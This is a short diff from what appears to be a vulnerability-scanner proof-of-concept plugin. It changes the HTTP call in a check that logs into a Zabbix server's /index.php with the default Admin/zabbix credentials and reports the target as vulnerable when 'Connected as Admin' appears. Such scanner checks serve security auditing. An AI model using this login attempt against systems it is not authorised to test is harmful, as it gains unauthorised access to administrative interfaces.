@@ -37,10 +37,9 @@ class Poc(ABPoc):
             payload = "/index.php"
             url = arg + payload
             data = "request=&name=Admin&password=zabbix&autologin=1&enter=Sign+in"
-            code, head, res, errcode, _ = hh.http('-L "%s" -d "%s"' %(url,data))
-                       
-            if code == 200:
-                m = re.search("Connected as 'Admin'",res)
+            req = requests.post(url, data=data)
+            if req.status_code == 200:
+                m = re.search("Connected as 'Admin'",req.text)
                 if m:
                     self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))
 
